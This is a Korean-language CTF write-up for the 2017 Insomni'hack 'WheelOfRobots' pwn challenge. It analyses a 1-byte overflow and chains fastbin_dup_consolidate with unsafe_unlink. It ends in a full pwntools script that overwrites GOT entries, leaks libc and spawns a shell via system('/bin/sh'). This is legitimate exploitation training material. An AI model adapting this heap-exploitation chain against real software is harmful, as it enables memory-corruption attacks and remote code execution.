---
layout: post
title: "[2017_Insomni'hack] WheelOfRobots 풀이"
date: 2018-09-26 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>[WheelOfRobots](https://github.com/pwnwiz/CTF/raw/master/WheelOfRobots/WheelOfRobots) 

으어

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2017_Insomni'hack/WheelOfRobots/01.png)
{: refdef}

`func_add`

1. 로봇 선택 (이때 `1byte overflow` 발생)

2. `2`, `3`, `6` 일 경우 로봇의 특성 값 같은걸 입력

3. 로봇의 이름만큼 할당받고 그 안에 이름이 들어감

4. `robot_count` 증가<br /><br />

`func_delete`

1. 로봇 선택

2. `flag` 값이 존재하면 `free(robot_name)`, `robot_count` 감소<br /><br />

`func_change`

1. 로봇 선택

2. `flag` 값이 존재하면 해당 로봇의 이름만큼 `read`<br /><br />

`func_start`

1. `robot_count`가 2 초과인지 확인 아닐시 `return`

2. `sub_4015BD(6)`의 결괏값과 `robot_flag` 값을 가지고 특정 함수 실행 (별로 안 중요)

3. `exit(1)`<br /><br />

`robot_list`

{: refdef: style="text-align: center;"}
![robot_list](/img/2017_Insomni'hack/WheelOfRobots/02.png)
{: refdef}

이 문제는 `robot_name`, `robot_flag`, `robot_len`까지 다 `bss`에 저장돼 있어요.

- - -
# 0x01. 공격 방법

`func_add`의 **1**을 보면 `1byte overflow`가 발생하는데 해당 버퍼를 보면 `robot_2_flag`의 값을 바꿀 수 있어요.

그래서 `robot_2`를 가지고 `unsafe_unlink`를 사용할 거에요.

`robot_2`는 `fastbin`이라서 `fastbin_dup_consolidate`을 사용할 수 있어요.

1. `func_add(2)` input = `2`

2. `func_add(4)`

3. `func_delete(2)`

4. `func_add(5)`, `robot_2_flag = 1`

5. `func_change(2)`를 사용해 `fake_chunk`를 만듦

6. `func_delete(4)` -> `robot_2`의 `fake_chunk`에서 `unlink` 실행

7. `robot_2_name`의 주소가 `robot_2_name - 0x18`로 바뀜

8. `func_change(2)`로 `robot_2_name - 0x18`부터 `0x28`만큼 데이터를 바뀌서 `system(/bin/sh)` 실행

- - -
# 0x02. 익스플로잇

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = ""
PORT = 4444
#PORT =

s = remote(HOST, PORT)
pause()

elf = ELF("./WheelOfRobots")
libc = ELF("./libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
free_got = elf.got["free"]

puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]

robot_4_name = 0x6030E0
robot_2_name = 0x6030F0
robot_2_flag = 0x603114

def func_add(index):
    s.recvuntil("Your choice : ")
    s.sendline("1")

    s.recvuntil("Your choice :")
    s.sendline(index)

def func_delete(index):
    s.recvuntil("Your choice : ")
    s.sendline("2")

    s.recvuntil("Your choice :")
    s.sendline(str(index))

def func_change(index, content):
    s.recvuntil("Your choice : ")
    s.sendline("3")

    s.recvuntil("Your choice :")
    s.sendline(str(index))

    s.recvuntil("Robot's name: ")
    s.send(content)

func_add(str(2))
s.sendline("2")
func_add(str(4))

func_delete(2)
func_add("5" + "\x00\x00\x00" + "\x01")

payload = p64(0x0)
payload += p64(0x20)
payload += p64(robot_2_name - 0x18)
payload += p64(robot_2_name - 0x10)
payload += p64(0x20)
func_change(2, payload)

func_delete(4)

payload = p64(0x0)*3
payload += p64(robot_4_name) # robot_2_name
func_change(2, payload)

payload = p64(free_got) # robot_4_name
payload += p64(puts_got) # robot_6_name
payload += p64(robot_2_flag) # robot_2_name
func_change(2, payload)

payload = p32(0x1)*3 # robot_2, 4, 6 flag
func_change(2, payload)

func_change(4, p64(puts_plt))
func_delete(6) # libc_leak
libc_puts = u64(s.recvuntil("\x7f").ljust(8, "\x00"))

libc_base = libc_puts - puts_off
libc_system = libc_base + system_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_puts : " + hex(libc_puts))
log.info("libc_system : " + hex(libc_system))
print

func_change(4, p64(libc_system))
func_change(2, "/bin/sh\0")
func_delete(2)

s.interactive()
```
